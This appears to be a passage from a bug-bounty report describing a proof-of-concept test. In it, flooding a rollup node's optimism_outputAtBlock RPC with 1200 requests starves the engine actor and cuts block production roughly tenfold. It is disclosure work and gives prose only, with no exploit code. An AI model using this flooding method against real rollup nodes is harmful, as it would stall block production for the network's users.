The test launches a real `EngineActor` (production `actor.rs:57-169` code path with `tokio::select!` routing loop and `rpc_tx` channel creation), a real `RpcActor` (jsonrpsee HTTP server with the full HTTP middleware stack: `TimeoutLayer(60s)` + `ConcurrencyLimitLayer(1024)` + `LoadShedLayer`, registering `RollupNodeApiServer`'s `optimism_outputAtBlock` method), and bridges them through `QueuedEngineRpcClient` to the same shared `engine_actor_request_tx` channel. The `SequencerSimulator` sends `BuildRequest` every 2 seconds through the same channel, precisely mimicking production `SequencerActor`'s block production flow.

Phase 1 verifies normal block production (5 blocks in 10 seconds, rate=0.50 blocks/s). Phase 2 sends 1200 `optimism_outputAtBlock` requests via HTTP client to the RpcActor, traversing the complete production path. Phase 3 measures the block production rate for 20 seconds after the attack: 1 block/20s (rate=0.05), delay ratio 1000%, far exceeding the Immunefi High threshold of 500%.
{% endstep %}
{% endstepper %}
